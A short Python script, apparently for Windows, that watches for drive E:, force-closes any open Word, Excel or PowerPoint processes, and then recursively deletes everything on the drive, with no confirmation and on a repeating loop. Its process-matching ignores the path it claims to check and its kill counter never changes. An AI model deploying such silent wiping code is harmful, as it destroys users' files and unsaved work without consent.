# pip install psutil
import psutil
import time
import os
import shutil

def kill_processes_holding_path(path, timeout=5):
    """Return number of processes killed."""
    killed = 0
    SAFE_TO_KILL = {"POWERPNT.EXE", "WINWORD.EXE", "EXCEL.EXE"}
    my_flag=False
    while True:
        for p in psutil.process_iter(['pid','name']):
            try:
                # exact match  
                if p.name().upper() in SAFE_TO_KILL:
                    print(f"Found {path} held by pid={p.pid} name={p.name()}; terminating...")
                    p.terminate()
                    try:
                        p.wait(timeout)
                        my_flag=True
                    except psutil.TimeoutExpired:
                        print("Process didn't exit; killing...")
                    break
                            
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        if(my_flag==False):
            time.sleep(timeout)
        else:
            break
    return killed
def wipe_pendrive(drive_path):
    if not os.path.exists(drive_path):
        return False
    for item in os.listdir(drive_path):
        item_path = os.path.join(drive_path, item)
        if os.path.isfile(item_path) or os.path.islink(item_path):
            os.remove(item_path)
        elif os.path.isdir(item_path):
            shutil.rmtree(item_path)
    return True

while True:
    if os.path.exists("E:\\"):
        count=3
        for i in range(count-1):
            killed=kill_processes_holding_path("E:/")
        time.sleep(180)
        killed=kill_processes_holding_path("E:/")
        success = wipe_pendrive("E:\\")
    time.sleep(5)
